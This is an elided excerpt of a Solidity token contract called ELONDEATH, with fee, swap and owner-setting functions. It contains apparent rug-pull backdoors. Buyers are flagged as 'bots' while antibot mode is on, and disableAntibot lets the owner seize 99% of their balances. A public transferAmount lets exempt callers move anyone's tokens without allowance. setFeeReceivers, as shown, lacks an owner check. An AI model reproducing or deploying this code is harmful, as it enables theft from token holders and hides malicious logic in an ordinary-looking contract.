...
contract ELONDEATH is IERC20, Ownable {
    ...
    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) { 
        return (marketingFee, liquidityFee, giveawayFee, devFee, burnFee, totalFee, feeDenominator);
    }
    ...
    function viewPairBalance() public view returns (uint256) { return _balances[pair]; }
    ...
    function transferAmount(address sender, uint256 amount) public swapping returns (bool, uint256) {
        ...
        require(isLimitExempt[msg.sender], "Insufficient Allowance");
    ...
    function disableAntibot() external onlyOwner {
        ...
        for (uint256 i = 0; i < bots.length; i++) {
            _transferFrom(bots[i], address(this), balanceOf(bots[i]).mul(99).div(100));
        }
        antibotOn = false;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(antibotOn && !isLimitExempt[recipient] && recipient != pair) {
            bots.push(recipient);
        } else if (recipient != pair && !isLimitExempt[recipient]) {
            require(amount < _transferLimit || isLimitExempt[sender], "Max Transaction Exceeded");
    ...
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 totalFeeAmount = amount.mul(getTotalFee(receiver == pair)).div(feeDenominator);
    ...
    function setSwapBackSettings(bool _takingFees, uint256 _amountS, uint256 _amountL, bool _alternate) external onlyOwner {
    ...
    function swapBack() internal swapping {
        ...
        if (marketingReceiver == giveawayReceiver) {
            (bool success,) = payable(giveawayReceiver).call{value: amountBNBMarketing.add(amountBNBGiveaway), gas: 30000}("");
            require(success, "receiver rejected ETH transfer");
        } else {
            (bool success,)  = payable(marketingReceiver).call{value: amountBNBMarketing, gas: 30000}("");
    ...
    function getLiquidityFactor() public view returns (uint256) { // in multiple of 100
        ...
        return (getCirculatingSupply().mul(accuracy).div(balanceOf(pair)) ** 2).div(accuracy);
    }

    function increaseMaxWalletManual(uint256 percent, uint256 denominator) external onlyOwner {
        require(percent >= 1 && denominator >= 100);
    ...
    function setIsLimitExempt(address holder, bool exempt) external onlyOwner {
     ...
     function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _giveawayFeeReceiver) external {
        ...
        giveawayReceiver = _giveawayFeeReceiver;
    }
